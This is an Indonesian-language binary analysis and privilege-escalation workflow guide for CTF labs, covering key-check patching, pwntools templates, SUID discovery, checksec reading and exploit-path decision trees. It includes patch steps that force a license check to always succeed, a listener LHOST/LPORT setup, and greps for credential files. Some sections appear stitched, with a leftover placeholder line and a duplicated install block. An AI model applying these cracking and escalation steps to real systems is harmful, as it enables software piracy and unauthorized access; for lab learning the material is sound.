File 49
```

---

# 6.3 🔑 License / Keygen Pattern

Struktur umum:

```text
INPUT
 ↓
TRANSFORMATION
 ↓
COMPARE
 ↓
VALID / INVALID
```

Contoh pseudo-code:

```c
input = read_key();
key = transform(input);

if (key == 0x13371337)
    success();
else
    fail();
```

Ghidra:

```text
main
 ↓
read_key
 ↓
transform
 ↓
compare
 ↓
success
```

---

# 6.3.1 🧠 Dua Pendekatan

### Reverse

```text
algorithm
 ↓
understand
 ↓
generate correct key
```

### Patch

```text
conditional branch
 ↓
change logic
 ↓
always success
```

Patching dibahas di Bagian 7.

---

# 6.4 👻 Hidden Functionality Pattern

Binary kadang mempunyai:

```text
normal usage
+
hidden argument
+
debug mode
+
secret function
```

Cari:

```bash
# Search help/usage strings
strings ./binary | \
grep -Ei 'usage|help|debug|admin|secret|hidden|test'
```

Ghidra:

```text
main
 ↓
argc/argv handling
 ↓
strcmp(argv[1], ...)
```

Contoh:

```c
if (strcmp(argv[1], "--admin") == 0)
    admin_mode();
```

---

# 🩹 BAGIAN 7 — BINARY PATCHING

> Patching paling cocok digunakan pada CTF/RE challenge untuk memahami control flow. Jangan menganggap binary patching sebagai “exploit” otomatis.

---

# 7.1 🧱 NOP Patching

... (existing content unchanged up to backup binary) ...

## Verify the patch
```bash
# Verify that the NOPs were written at the correct offset
objdump -d binary.patched | grep -A5 'TARGET_FUNCTION'

# Compare raw bytes before and after
xxd -s 0x1234 -l 8 binary.original
xxd -s 0x1234 -l 8 binary.patched

# Execute the patched binary to ensure it still runs
chmod +x binary.patched
./binary.patched
```

If the disassembly shows the expected NOP sequence and the program runs without crashing, the patch is successful.


NOP:

```text
0x90
```

Secara konsep:

```text
instruction
 ↓
NOP
 ↓
does nothing
```

---

## Backup binary

```bash
# Always preserve original
cp ./binary ./binary.original
```

---

## Python patch

```python
from pathlib import Path

src = Path("binary.original")
dst = Path("binary.patched")

data = src.read_bytes()

OFFSET = 0x1234

# Replace 2 bytes with NOP instructions
patched = (
    data[:OFFSET]
    + b"\x90\x90"
    + data[OFFSET + 2:]
)

dst.write_bytes(patched)
```

---

# 7.1.1 🔎 Address vs File Offset

Ini sangat penting.

```text
0x401234
```

belum tentu:

```text
file offset = 0x401234
```

Ada perbedaan antara:

```text
virtual address
```

dan:

```text
file offset
```

Karena itu jangan patch address secara blind menggunakan Python.

Gunakan:

```text
Ghidra
readelf
objdump
radare2
```

untuk memetakan address ke file location.

---

# 7.1.2 🪚 radare2

```bash
# Open binary in write mode
r2 -w ./binary
```

Di radare2:

```text
s 0x401234
```

Write NOP:

```text
wa nop
```

Print bytes:

```text
px 16
```

---

# 7.2 🔀 Conditional Jump Patching

Pattern:

```asm
cmp eax, 0
jne fail
```

Secara konsep:

```text
JNE
 ↓
SUCCESS/FAIL branch
```

dapat diubah agar selalu menuju branch tertentu.

Contoh opcode umum x86:

```text
JE  = 0x74
JNE = 0x75
JMP = 0xEB
```

Namun:

> Opcode actual length, relative offset, architecture, dan instruction encoding harus diverifikasi terlebih dahulu.

Jangan sekadar:

```text
0x75 → 0xEB
```

tanpa memastikan instruction memang short conditional jump.

---

# 🧰 BAGIAN 8 — PWNTOOLS BASICS

# 8.1 📦 Setup

Parrot dapat memiliki system-managed Python environment.

Cek:

```bash
# Check Python version
python3 --version

# Check pip
python3 -m pip --version
```

Untuk environment terisolasi:

```bash
# Create virtual environment
python3 -m venv ~/venvs/pwn

# Activate
source ~/venvs/pwn/bin/activate

# Upgrade pip inside venv
python -m pip install --upgrade pip

# Install pwntools
# Create and activate a virtual environment (recommended on Parrot)
python3 -m venv ~/venvs/pwn
source ~/venvs/pwn/bin/activate

# Upgrade pip inside the venv
python -m pip install --upgrade pip

# Install pwntools
pip install pwntools   # or pip3 install pwntools

# Verify the installation
python3 -c "from pwn import *; print(pwnlib.__version__)"
```

---

# 8.2 🐍 Pwntools Template

```python
#!/usr/bin/env python3

from pwn import *

# Load ELF metadata
elf = ELF("./binary", checksec=False)

# Set architecture/context automatically from ELF
context.binary = elf

# Debug-friendly log level
context.log_level = "info"

# Local process
p = process(elf.path)

# Example input
p.sendlineafter(b"> ", b"test")

# Receive response
response = p.recvline()

log.info(f"Response: {response!r}")

# Interactive session
p.interactive()
```

Remote:

```python
from pwn import *

elf = ELF("./binary", checksec=False)
context.binary = elf

# Connect to remote CTF service
p = remote("10.10.10.10", 31337)

p.sendline(b"test")

p.interactive()
```

---

# 8.2.1 🧠 Local vs Remote

```text
process()
    ↓
binary local

remote()
    ↓
CTF server
```

Biasakan:

```text
LOCAL TEST
    ↓
WORKS
    ↓
REMOTE
```

---

# 8.3 📚 Pwntools Quick Reference

|Function|Kegunaan|Contoh|
|---|---|---|
|`process()`|Start local process|`process("./binary")`|
|`remote()`|Connect remote service|`remote(host, port)`|
|`send()`|Kirim bytes|`p.send(b"A")`|
|`sendline()`|Kirim + newline|`p.sendline(b"AAAA")`|
|`sendafter()`|Tunggu marker lalu kirim|`p.sendafter(b"> ", b"A")`|
|`sendlineafter()`|Tunggu marker + newline|`p.sendlineafter(b"> ", b"A")`|
|`recv()`|Receive bytes|`p.recv()`|
|`recvline()`|Receive line|`p.recvline()`|
|`recvuntil()`|Receive until marker|`p.recvuntil(b"OK")`|
|`interactive()`|Interactive terminal|`p.interactive()`|
|`p64()`|Pack 64-bit LE|`p64(0x401234)`|
|`p32()`|Pack 32-bit LE|`p32(0x08041234)`|
|`u64()`|Unpack 64-bit|`u64(data)`|
|`u32()`|Unpack 32-bit|`u32(data)`|
|`flat()`|Build payload|`flat({offset: addr})`|
|`cyclic()`|Generate pattern|`cyclic(300)`|
|`cyclic_find()`|Find offset|`cyclic_find(value)`|
|`ELF()`|Parse binary|`ELF("./binary")`|
|`ROP()`|Build ROP chain|`ROP(elf)`|
|`asm()`|Assemble instruction|`asm("nop")`|
|`disasm()`|Disassemble bytes|`disasm(data)`|
|`p32/p64`|Integer → bytes|`p64(addr)`|

---

# 8.3.1 🔢 Packing Example

```python
from pwn import *

# Example 64-bit address
address = 0x401234

# Convert integer to 8-byte little-endian
payload = p64(address)

print(payload)
```

---

# 8.3.2 🔄 Unpacking

```python
from pwn import *

data = b"\x34\x12\x40\x00\x00\x00\x00\x00"

# Convert bytes to integer
address = u64(data)

print(hex(address))
```

---

# 8.3.3 🔢 cyclic

```python
from pwn import *

# Generate 300-byte unique pattern
pattern = cyclic(300)

print(pattern)
```

Find offset:

```python
from pwn import *

# Example crash value
value = 0x61616166

offset = cyclic_find(value)

print(offset)
```

---

# 🧠 BAGIAN 9 — COMMON ERRORS & TROUBLESHOOTING

|Error|Penyebab|Solusi|
|---|---|---|
|`Segmentation fault`|Memory access invalid|GDB → registers → backtrace|
|GDB attach ditolak|Permission / Yama / SUID restrictions|Debug copy sebagai non-SUID jika memungkinkan|
|ltrace tidak bekerja|Static binary / anti-tracing / unsupported behavior|Ghidra/strace|
|Ghidra decompile buruk|Optimized/stripped binary|Disassembly + function analysis|
|Binary stripped|Symbols hilang|Ghidra + function signatures|
|`checksec: command not found`|Tool belum tersedia|Install pwntools/checksec atau gunakan GDB/readelf|
|pwntools tidak connect|Host/port salah / network|Test connectivity dan verify target|
|Missing shared library|Dependency tidak tersedia|`ldd`, locate library, inspect runtime|
|Format string tidak terlihat|Input bukan format string|Ghidra source flow|
|PATH injection gagal|Absolute path digunakan|Konfirmasi `execve()`|
|Static binary|`ldd` tidak menunjukkan libraries|Fokus internal code|
|Binary butuh TTY|Program memakai terminal checks|Jalankan dengan PTY/GDB/appropriate terminal|
|Permission denied|File not executable|`ls -la`, filesystem mount, ownership|
|Binary crash segera|Input/initialization bug|GDB breakpoint di `_start`/`main`|
|GDB hang|Anti-debugging / blocking I/O|`strace`, inspect syscalls|
|`ptrace` denied|Kernel security policy|Gunakan copy/child debugging|
|`ltrace` hanya sedikit output|Statically linked/custom syscall|Use GDB/Ghidra|
|`strings` kosong|Binary compressed/encrypted/optimized|Ghidra/sections/entropy analysis|
|`objdump` gagal|Unsupported architecture/input|`file`, `readelf -h`|
|`cannot execute`|Architecture mismatch|`file binary`, compare architecture|
|pwntools import error|Wrong Python environment|Use venv|
|Ghidra function names aneh|Stripped|Rename manually|
|`cyclic_find` tidak cocok|Wrong byte width/endian|Check RIP/EIP value and architecture|

---

# 9.1 🛠️ GDB Tidak Bisa Attach SUID

Masalah umum:

```text
SUID binary
+
debugging
```

tidak selalu berjalan seperti binary biasa karena kernel/security behavior dapat mengubah privilege handling.

Solusi praktis:

```text
COPY BINARY
    ↓
REMOVE SUID ON COPY
    ↓
DEBUG COPY
```

Contoh lab:

```bash
# Copy binary
cp /opt/custom_backup /tmp/custom_backup.debug

# Ensure copy is not SUID
chmod u-s /tmp/custom_backup.debug

# Debug copy
gdb /tmp/custom_backup.debug
```

### ⚠️ Caveat

Behavior binary dapat berubah setelah SUID dihilangkan.

Jadi:

```text
debug copy
=
understand logic

original SUID
=
verify privilege behavior separately
```

---

# 9.2 🧱 Static Binary

Jika:

```bash
ldd ./binary
```

menghasilkan:

```text
not a dynamic executable
```

atau equivalent static indication:

```text
binary static
```

jangan panik.

Artinya:

```text
Tidak bergantung pada dynamic libraries
```

Gunakan:

```bash
# Symbols
readelf -s ./binary

# Disassembly
objdump -d ./binary

# Strings
strings ./binary
```

dan:

```text
Ghidra
```

---

# 🧠 BAGIAN 10 — QUICK REFERENCE CHEATSHEET

# 10.1 📄 Static Analysis

```bash
# File type
file ./binary

# Permissions/owner
ls -la ./binary

# Strip status
file ./binary | grep -iE "stripped|not stripped"

# Libraries
ldd ./binary

# Security mitigations
checksec --file=./binary

# Strings
strings ./binary

# Long strings only
strings -n 8 ./binary

# Interesting strings
strings ./binary | \
grep -Ei 'password|secret|flag|key|system|exec|bash|shadow|passwd|http'

# ELF sections
readelf -S ./binary

# Symbols
readelf -s ./binary

# Dynamic dependencies
readelf -d ./binary | grep NEEDED

# Dynamic symbols
objdump -T ./binary

# Disassembly
objdump -d ./binary
```

---

# 10.2 🕵️ Dynamic Analysis

```bash
# strace
strace ./binary 2>&1

# Specific syscalls
strace \
  -e trace=openat,read,write,execve \
  ./binary 2>&1

# Save strace
strace -o /tmp/strace.out ./binary

# Follow child processes
strace -f ./binary 2>&1

# ltrace
ltrace ./binary 2>&1

# Trace strcmp
ltrace -e strcmp ./binary 2>&1

# Trace string-related functions
ltrace -e 'str*' ./binary 2>&1
```

---

# 10.3 🐞 GDB

```bash
# Open
gdb ./binary
```

```gdb
# Use Intel syntax
set disassembly-flavor intel

# Start
run

# Start with argument
run arg1 arg2

# Break main
break main

# Continue
continue

# Next
next

# Step into
step

# Finish function
finish

# Registers
info registers

# Functions
info functions

# Symbols
info symbols

# Stack
x/20gx $rsp

# String
x/s ADDRESS

# Disassemble
disassemble main

# Backtrace
backtrace

# Memory mappings
info proc mappings
```

---

# 10.4 🐍 Pwntools Template

```python
#!/usr/bin/env python3

from pwn import *

# Parse ELF
elf = ELF("./binary", checksec=False)

# Configure architecture automatically
context.binary = elf
context.log_level = "info"

# Start process
p = process(elf.path)

# Example:
# p.sendlineafter(b"> ", b"AAAA")

# Receive data
# print(p.recvline())

# Interactive
p.interactive()
```

---

# 🧭 BAGIAN 11 — MASTER DECISION TREE

```text
                    [BINARY DITEMUKAN]
                            │
                            ▼
                    [file ./binary]
                            │
                            ▼
                  [ls -la + ownership]
                            │
                            ▼
                         [checksec]
                            │
              ┌─────────────┼──────────────┐
              │             │              │
              ▼             ▼              ▼
             SUID          PIE/NX        Canary
              │             │              │
              ▼             ▼              ▼
       PrivEsc context   Exploit clues   BOF clues
              │
              ▼
                         [strings]
                            │
              ┌─────────────┼──────────────┐
              │             │              │
              ▼             ▼              ▼
          password        /bin/sh        flag
              │             │              │
              ▼             ▼              ▼
           ltrace        strace         Ghidra
              │
              ▼
                           [ldd]
                            │
                     ┌──────┴──────┐
                     │             │
                     ▼             ▼
                  dynamic        static
                     │             │
                     ▼             ▼
                 ltrace        objdump
                 strace         Ghidra
                     │             │
                     └──────┬──────┘
                            │
                            ▼
                       [RUN INPUT]
                            │
                ┌───────────┼────────────┐
                │           │            │
                ▼           ▼            ▼
             normal       long        special
                           input        chars
                │           │            │
                │           ▼            ▼
                │          CRASH      behavior?
                │           │            │
                │           ▼            ▼
                │          GDB         Ghidra
                │           │
                │           ▼
                │      [RIP CONTROLLED?]
                │           │
                │          YES
                │           │
                │           ▼
                │       [BUFFER OVERFLOW]
                │           │
                │           ▼
                │        FILE 49
                │
                ▼
             [ltrace]
                │
       ┌────────┼────────────┐
       │        │            │
       ▼        ▼            ▼
    strcmp    system       exec
       │        │            │
       ▼        ▼            ▼
   PASSWORD    COMMAND     PROCESS
     CHECK     INJECTION   ANALYSIS
       │
       ▼
    [GHIDRA]
       │
       ▼
 [UNDERSTAND LOGIC]
       │
       ▼
 [IDENTIFY VULN CLASS]
       │
  ┌────┼────────┬──────────┐
  │    │        │          │
  ▼    ▼        ▼          ▼
PATH  BOF     FORMAT    LIBRARY
INJ           STRING    HIJACK
  │    │        │          │
  ▼    ▼        ▼          ▼
F47  F49      F49        F47
```

---

# ⚡ 11.1 30-SECOND BINARY TRIAGE

Ketika menemukan binary:

```bash
# 1
file ./binary

# 2
ls -la ./binary

# 3
checksec --file=./binary

# 4
strings ./binary | head -100

# 5
ldd ./binary

# 6
objdump -T ./binary | grep -E \
'strcmp|strcpy|system|execve|printf|gets'

# 7
strace ./binary 2>&1

# 8
ltrace ./binary 2>&1
```

Kemudian:

```text
PASSWORD?
    ↓
ltrace

PATH?
    ↓
strace

CRASH?
    ↓
GDB

LOGIC?
    ↓
Ghidra

BOF?
    ↓
File 49
```

---

# 🎯 BAGIAN 12 — CROSS-WORKFLOW

## ← File 47 — Sudo/SUID/Capabilities

```text
./[🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)
```

Trigger:

```text
SUID custom binary
        ↓
GTFOBins tidak membantu
        ↓
Binary Analysis
        ↓
File 48
```

Contoh:

```text
File 47
   ↓
/opt/custom_backup
   ↓
SUID root
   ↓
File 48
   ↓
strace
   ↓
execve("backup")
   ↓
PATH injection
   ↓
File 47
```

---

# ← File 44 — Linux PrivEsc

```text
./[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

File 44 menemukan:

```text
Privilege escalation candidate
```

File 48 menjawab:

```text
"Apa sebenarnya yang dilakukan binary?"
```

---

# → File 49 — Buffer Overflow

```text
./[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow)
```

Trigger:

```text
Fuzz
 ↓
Crash
 ↓
RIP controlled
 ↓
Buffer Overflow
 ↓
File 49
```

---

# → File 50 — ROP Chain

```text
./[🔗 50 — ROP Chain Workflow](/docs/rop-chain)
```

Trigger:

```text
BOF
 ↓
NX enabled
 ↓
Need code reuse
 ↓
ROP
 ↓
File 50
```

---

# → File 51 — Reverse Engineering

```text
./[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering)
```

Trigger:

```text
Complex logic
 ↓
algorithm
 ↓
cryptography
 ↓
state machine
 ↓
anti-analysis
 ↓
deep RE
```

---

# 🧠 BAGIAN 13 — MASTER BINARY ANALYSIS MENTAL MODEL

Jangan menghafal:

```text
"pakai Ghidra"
"pakai GDB"
"pakai strace"
```

Hafalkan:

```text
QUESTION
   ↓
CHOOSE TOOL
```

---

## ❓ "Binary ini apa?"

```bash
file ./binary
```

---

## ❓ "Siapa owner-nya?"

```bash
ls -la ./binary
```

---

## ❓ "Apakah protected?"

```bash
checksec --file=./binary
```

---

## ❓ "Ada clue?"

```bash
strings ./binary
```

---

## ❓ "Library apa yang digunakan?"

```bash
ldd ./binary
```

---

## ❓ "System call apa yang dilakukan?"

```bash
strace ./binary
```

---

## ❓ "Function library apa yang dipanggil?"

```bash
ltrace ./binary
```

---

## ❓ "Kenapa crash?"

```text
GDB
```

---

## ❓ "Program logic-nya apa?"

```text
Ghidra
```

---

# 🔬 BAGIAN 14 — PATTERN RECOGNITION

```text
┌────────────────────────────────────────────┐
│             BINARY PATTERN                 │
├────────────────────────────────────────────┤
│ strcmp(input, secret)                      │
│             ↓                              │
│ Password/Key Check                         │
├────────────────────────────────────────────┤
│ system(user_input)                         │
│             ↓                              │
│ Command Injection candidate                │
├────────────────────────────────────────────┤
│ execve("program", ...)                     │
│             ↓                              │
│ PATH candidate                             │
├────────────────────────────────────────────┤
│ strcpy(buf, input)                         │
│             ↓                              │
│ Buffer Overflow candidate                  │
├────────────────────────────────────────────┤
│ printf(input)                              │
│             ↓                              │
│ Format String candidate                    │
├────────────────────────────────────────────┤
│ SUID + custom binary                       │
│             ↓                              │
│ PrivEsc candidate                          │
├────────────────────────────────────────────┤
│ libcustom.so => not found                  │
│             ↓                              │
│ Library loading investigation              │
├────────────────────────────────────────────┤
│ checksec: no canary + NX off               │
│             ↓                              │
│ Memory corruption becomes more attractive  │
└────────────────────────────────────────────┘
```

---

# 🧠 BAGIAN 15 — GOLDEN RULES

## Rule 01 — 🔍 `file` selalu dulu

```bash
file ./binary
```

Jangan mulai GDB sebelum tahu:

```text
architecture
format
static/dynamic
stripped
```

---

## Rule 02 — 🔐 Check permission

```bash
ls -la ./binary
```

Karena:

```text
SUID
+
root owner
=
PrivEsc context
```

---

## Rule 03 — 🛡️ Checksec

```bash
checksec --file=./binary
```

Jangan langsung exploit sebelum memahami mitigation.

---

## Rule 04 — 🔤 Strings adalah reconnaissance

```bash
strings ./binary
```

Tetapi:

```text
String found
≠
vulnerability confirmed
```

---

## Rule 05 — 🕵️ strace = kernel-level behavior

Pertanyaan:

```text
"File/process/network apa yang disentuh?"
```

Gunakan:

```bash
strace ./binary
```

---

## Rule 06 — 🔬 ltrace = library-level behavior

Pertanyaan:

```text
"strcmp dipanggil dengan apa?"
"system() menerima argument apa?"
```

Gunakan:

```bash
ltrace ./binary
```

---

## Rule 07 — 🐞 Crash ≠ BOF

```text
Segmentation fault
```

adalah symptom.

Validasi:

```text
GDB
 ↓
RIP
 ↓
controlled?
```

---

## Rule 08 — 🧩 Ghidra untuk logic

Gunakan Ghidra ketika pertanyaannya:

```text
"Kenapa program mengambil keputusan ini?"
```

---

## Rule 09 — 🎯 Satu pertanyaan, satu tool

```text
Type?
 → file

Permission?
 → ls

Mitigation?
 → checksec

Clue?
 → strings

Syscall?
 → strace

Library?
 → ltrace

Crash?
 → GDB

Logic?
 → Ghidra
```

---

## Rule 10 — 🔁 Static + Dynamic harus dikombinasikan

```text
STATIC
 ↓
"apa yang mungkin terjadi"

DYNAMIC
 ↓
"apa yang benar-benar terjadi"
```

Keduanya saling melengkapi.

---

## Rule 11 — 🧪 Selalu buat hypothesis

Contoh:

```text
Hypothesis:
binary memanggil backup melalui PATH
```

Test:

```bash
strace ./binary 2>&1 | grep execve
```

Jika:

```text
execve("backup", ...)
```

hypothesis mendapat evidence.

---

## Rule 12 — 🧠 Jangan exploit sebelum memahami primitive

```text
Input
 ↓
Bug
 ↓
Primitive
 ↓
Impact
```

Contoh:

```text
user input
 ↓
strcpy overflow
 ↓
control RIP
 ↓
code execution
```

---

# 🏁 BAGIAN 16 — FINAL WORKFLOW

```text
                    CUSTOM BINARY
                          │
                          ▼
                    ┌───────────┐
                    │   FILE    │
                    └─────┬─────┘
                          │
                          ▼
                    ┌───────────┐
                    │ LS -LA    │
                    └─────┬─────┘
                          │
                          ▼
                    ┌───────────┐
                    │ CHECKSEC  │
                    └─────┬─────┘
                          │
                          ▼
                    ┌───────────┐
                    │ STRINGS   │
                    └─────┬─────┘
                          │
             ┌────────────┼────────────┐
             │            │            │
             ▼            ▼            ▼
          PASSWORD      COMMAND      BOF CLUE
             │            │            │
             ▼            ▼            ▼
          LTRACE       STRACE         GDB
             │            │            │
             └────────────┼────────────┘
                          │
                          ▼
                       GHIDRA
                          │
                          ▼
                 IDENTIFY VULN CLASS
                          │
          ┌───────────────┼────────────────┐
          │               │                │
          ▼               ▼                ▼
        PATH            BOF            FORMAT STR
          │               │                │
          ▼               ▼                ▼
        FILE 47        FILE 49          FILE 49
                          │
                          ▼
                        ROP?
                          │
                          ▼
                        FILE 50
```

---

# 🎯 BAGIAN 17 — THE ONE-LINE MEMORY

```text
FILE → PERMISSION → CHECKSEC → STRINGS → LDD → STRACE → LTRACE → GDB → GHIDRA → IDENTIFY BUG → NEXT WORKFLOW
```

---

# 🧠 BAGIAN 18 — THE REAL SKILL

Tujuan akhirnya bukan:

```text
"Aku hafal Ghidra."
```

atau:

```text
"Aku hafal command GDB."
```

Skill sebenarnya:

```text
BINARY
   ↓
QUESTION
   ↓
EVIDENCE
   ↓
HYPOTHESIS
   ↓
TEST
   ↓
VULNERABILITY
   ↓
IMPACT
```

Contoh:

```text
Custom SUID
   ↓
Apa yang dilakukan?
   ↓
strings + strace
   ↓
execve("backup")
   ↓
Mengapa tanpa absolute path?
   ↓
PATH controlled?
   ↓
YES
   ↓
PATH injection
   ↓
Privilege escalation
```

---

# 🏆 FINAL CTF CHECKLIST

```text
╔══════════════════════════════════════════════════╗
║          BINARY ANALYSIS MASTER CHECKLIST       ║
╚══════════════════════════════════════════════════╝
```

## 📄 TRIAGE

```text
[ ] file
[ ] ls -la
[ ] owner
[ ] SUID/SGID
[ ] stripped/not stripped
[ ] architecture
[ ] static/dynamic
[ ] checksec
```

## 🔤 STATIC

```text
[ ] strings
[ ] readelf -S
[ ] readelf -s
[ ] readelf -d
[ ] objdump -T
[ ] objdump -d
[ ] imported functions
[ ] dangerous functions
```

## 🕵️ DYNAMIC

```text
[ ] strace
[ ] execve
[ ] open/openat
[ ] connect
[ ] read/write
[ ] ltrace
[ ] strcmp
[ ] memcmp
[ ] system
[ ] exec
```

## 🐞 GDB

```text
[ ] break main
[ ] info registers
[ ] disassemble
[ ] stack
[ ] RIP
[ ] RSP
[ ] crash analysis
[ ] cyclic pattern
[ ] offset
```

## 🏛️ GHIDRA

```text
[ ] import binary
[ ] auto analyze
[ ] main
[ ] strings
[ ] XREF
[ ] strcmp
[ ] system
[ ] dangerous input
[ ] rename functions
[ ] rename variables
[ ] comments
[ ] trace data flow
```

## 🎯 VULNERABILITY CLASS

```text
[ ] Password check
[ ] Hardcoded secret
[ ] Command injection
[ ] PATH injection
[ ] Buffer overflow
[ ] Format string
[ ] Library hijacking
[ ] Logic flaw
[ ] Hidden functionality
[ ] PrivEsc primitive
```

## 🔗 NEXT WORKFLOW

```text
[ ] PATH → File 47
[ ] BOF → File 49
[ ] ROP → File 50
[ ] Deep RE → File 51
```

---

# # [🔬 48 — Binary Analysis Workflow](/docs/binary-analysis) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. File ini digunakan ketika menemukan binary yang perlu dianalisis — baik dari CTF, SUID custom binary, atau binary yang berjalan sebagai root.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun.
export BINARY="/opt/custom_backup"    # Path binary yang akan dianalisis
export LHOST="10.10.14.5"            # IP tun0 kamu
export LPORT="4444"
mkdir -p ~/binary_analysis/{static,dynamic,ghidra,exploit}
cd ~/binary_analysis

echo "[*] Target Binary: $BINARY"
echo "[*] Analysis workspace: ~/binary_analysis"
```

**Kapan masuk file ini?**

text

```
File 47 (SUID/sudo)
    ↓
SUID binary custom ditemukan
    ↓
GTFOBins tidak membantu
    ↓
MASUK FILE 48

ATAU:
CTF memberikan ELF binary
    ↓
MASUK FILE 48
```

---

## ═══════════════════════════════════════

## FASE 0: 30-SECOND TRIAGE — KENALI BINARY DULU

## ═══════════════════════════════════════

> **WAJIB dijalankan semua. Jangan skip. 5 command ini memberikan 80% informasi yang kamu butuhkan.**

### Langkah 0.1 — `file` Command (Identifikasi Tipe Binary)

Bash

```
# Command 1: Basic identification
file $BINARY

# Command 2: Jika binary di lokasi lain
file /path/to/unknown_binary

# Command 3: Multiple binary sekaligus (jika ada beberapa)
file *
```

**OUTPUT BERHASIL ✅ — ELF 64-bit dinamis:**

text

```
/opt/custom_backup: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
for GNU/Linux 3.2.0, with debug_info, not stripped
```

**Cara baca output `file` — catat semua:**

|Field|Nilai|Arti & Tindakan|
|---|---|---|
|`ELF 64-bit`|Architecture|64-bit binary, pakai register r-prefix (rax, rsp, dll)|
|`LSB`|Endianness|Little-endian (paling umum di x86)|
|`pie executable`|PIE enabled|Alamat binary random saat jalan (ASLR aktif)|
|`dynamically linked`|Dynamic|Ada shared library → bisa ltrace, bisa library hijacking|
|`not stripped`|Symbols ada|Function names masih ada → GDB/Ghidra lebih mudah|
|`stripped`|Symbols hilang|Harder to reverse, tapi tetap bisa|
|`with debug_info`|Debug symbols|BONUS! Variabel dan line numbers masih ada|

**OUTPUT BERHASIL ✅ — ELF 32-bit:**

text

```
./binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, not stripped
```

➡️ 32-bit binary. Pakai register e-prefix (eax, esp, dll). Calling convention berbeda.

**OUTPUT BERHASIL ✅ — Static binary:**

text

```
./binary: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

➡️ Static binary. Tidak ada shared library → ltrace tidak akan bekerja. Langsung ke Ghidra/GDB.

**OUTPUT BERHASIL ✅ — Script:**

text

```
./script: Python script, ASCII text executable
./run.sh: Bourne-Again shell script, ASCII text executable
```

➡️ Bukan binary! Buka langsung dengan editor: `cat ./script`

**OUTPUT GAGAL ❌ — Bukan ELF:**

text

```
./file.txt: ASCII text
./archive.zip: Zip archive data
./data.bin: data
```

➡️ Bukan executable binary. Cek context: mungkin ini file data yang perlu dianalisis dengan cara berbeda.

---

### Langkah 0.2 — Permission & Ownership Check

Bash

```
# Command 1: Detail lengkap
ls -la $BINARY

# Command 2: Stat untuk info lengkap
stat $BINARY

# Command 3: Cari SUID/SGID sekaligus
find /opt /usr/local /home /tmp -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la 2>/dev/null
```

**OUTPUT BERHASIL ✅ — SUID root binary (PRIORITAS TINGGI!):**

text

```
-rwsr-xr-x 1 root root 17384 Sep  8 12:10 /opt/custom_backup
```

**Cara baca permission SUID:**

text

```
-rwsr-xr-x
    ↑
    s = SUID aktif + execute bit aktif = EXPLOITABLE
    
-rwSr-xr-x  
    ↑
    S = SUID bit ada tapi execute bit tidak aktif = tidak bisa dieksekusi normal
```

➡️ SUID binary = ini adalah PrivEsc candidate! Lanjut analisis mendalam.

**OUTPUT BERHASIL ✅ — Binary biasa (non-SUID):**

text

```
-rwxr-xr-x 1 alice alice 8432 Sep 8 12:10 ./login
```

➡️ CTF binary. Tidak ada privilege escalation dari permission, tapi tetap analisis untuk logic/vulnerability.

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
ls: cannot access '/opt/custom_backup': Permission denied
```

➡️ Kamu tidak punya read access. Coba:

Bash

```
# Jika sudah punya sudo atau creds lain
sudo ls -la /opt/custom_backup
# Atau coba copy dulu ke /tmp jika bisa execute
cp /opt/custom_backup /tmp/backup_copy 2>/dev/null || echo "Cannot copy"
```

---

### Langkah 0.3 — Checksec (Security Mitigations)

Bash

```
# Command 1: Checksec standard
checksec --file=$BINARY

# Command 2: Format table (lebih readable)
checksec --file=$BINARY --format=table

# Command 3: Jika checksec tidak ada, gunakan GDB
gdb -batch -ex "checksec" $BINARY 2>/dev/null || python3 -c "
import subprocess
r = subprocess.run(['readelf', '-l', '$BINARY'], capture_output=True, text=True)
print('Stack exec:', 'RWE' if 'GNU_STACK' in r.stdout and 'RWE' in r.stdout else 'No exec stack')
"
```

**OUTPUT BERHASIL ✅ — Checksec output:**

text

```
[*] '/opt/custom_backup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**Cara baca dan tindakan berdasarkan mitigations:**

|Mitigation|Status|Implikasi untuk Exploit|
|---|---|---|
|**NX enabled**|Stack tidak executable|Traditional shellcode di stack tidak bisa → perlu ROP/ret2libc|
|**NX disabled**|Stack executable|Bisa taruh shellcode di stack langsung|
|**Canary found**|Stack canary aktif|BOF lebih sulit, perlu leak canary dulu|
|**No canary**|Tidak ada canary|BOF lebih straightforward jika ada overflow|
|**PIE enabled**|ASLR untuk binary|Perlu leak alamat binary dulu|
|**PIE disabled**|Alamat binary fixed|Bisa hardcode alamat fungsi|
|**Full RELRO**|GOT read-only|GOT overwrite tidak bisa|
|**Partial RELRO**|GOT bisa ditulis|GOT overwrite mungkin bisa|
|**No RELRO**|GOT sangat writable|GOT overwrite kandidat kuat|

**Strategi exploit berdasarkan kombinasi:**

text

```
No canary + NX disabled + PIE disabled
    → Classic stack BOF dengan shellcode (paling mudah)
    → → File 49

No canary + NX enabled + PIE disabled  
    → ret2win atau ret2libc dengan alamat hardcode
    → → File 49

No canary + NX enabled + PIE enabled
    → Perlu leak address dulu, lalu ROP
    → → File 49 → File 50

Canary + NX enabled + PIE enabled (Full protection)
    → Perlu leak canary + leak address + ROP chain
    → → File 49 → File 50 (advanced)
```

**OUTPUT GAGAL ❌ — checksec not found:**

text

```
bash: checksec: command not found
```

➡️ Install atau gunakan alternatif:

Bash

```
# Install checksec
pip3 install checksec.py
# atau
sudo apt install checksec

# Alternatif manual: cek NX
readelf -l $BINARY | grep -A1 GNU_STACK

# Alternatif manual: cek PIE
readelf -h $BINARY | grep "Type:" | grep -q "DYN" && echo "PIE enabled" || echo "PIE disabled"
```

---

### Langkah 0.4 — Strings Analysis (Quick Reconnaissance)

Bash

```
# Command 1: Semua strings
